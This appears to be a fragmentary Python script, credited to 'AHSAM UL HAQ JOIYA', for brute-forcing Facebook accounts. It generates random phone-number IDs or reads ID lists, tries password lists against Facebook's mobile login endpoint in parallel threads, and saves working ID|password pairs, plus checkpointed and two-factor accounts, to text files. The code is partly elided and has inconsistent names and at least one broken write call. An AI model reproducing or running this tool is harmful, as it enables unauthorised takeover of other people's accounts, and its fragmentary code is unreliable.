...
from concurrent.futures import ThreadPoolExecutor as Mr_AUH_BRAND
...
\033[1;97m ------------------------------
\033[1;97m [+] Author : AHSAM UL HAQ JOIYA
\033[1;97m [+] Fb id  : AHSAM UL HAQ 
\033[1;97m [+] group  : (MR-AUH)
...
def random_crack():
    global ok,cp,tf
    mr_AHSAM(minx)
    mr_AHSAM(' [1] Random Number')
    mr_AHSAM(' [2] Random Email ')
    mr_AHSAM(' [0] main-menu')
    mr_AHSAM(minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        ...
        print(AUH)
        mr_AHSAM(minx)
        mr_AHSAM(' [+] any country code without + ')
        mr_AHSAM(minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(AUH)
        ...
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            ...
            print(AUH)
            mr_AHSAM(minx)
            mr_AHSAM(' [+] Total ids: '+total_ids)            
            mr_AHSAM(' [+] Use flight mode for speed')
            mr_AHSAM(minx)
            for user in fo:
                ids,ps = user.split('|')
        ...
        mr_AHSAM(minx)
        mr_AHSAM(' The process has completed')
        mr_AHSAM(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        ...
        with Mr_AHSAM(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(AUH)
            mr_AHSAM(minx)
        ...
        mr_AHSAM('please put correct adress... ')
        time.sleep(1)
        random_crack()
...
def file_crack():
    ...
    try:
        ...
        mr_AHSAM(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
    ...
    with Mr_AHSAM(max_workers=25) as crack_submit:
        os.system('clear')
        print(AUH)
        total_ids = str(len(fo))
        mr_AHSAM(minx)
        ...
        for user in fo:
            ...
            if opt_method =='1':
                ...
                mr_AHSAM(' something wrong in methods ');exit()
    mr_AHSAM(minx)
    mr_AHSAM(' The process has completed')
    mr_AHSAM(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[AUH-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[AUH-XA] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[AUH-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                print('\033[1;32m[AUH-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[AUH-XA] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[AUH-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
...
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            ...
            if 'c_user' in cookies:
                    print('\033[1;32m[AUH-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/AUH_ID/ok.txt', 'a').write(ids+' | '+pas+'\n').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[AUH-XA] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/AUH_ID/random2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;31m[AUH-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/AUH_ID/randomcp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
        loop+=1
    except Exception as e:
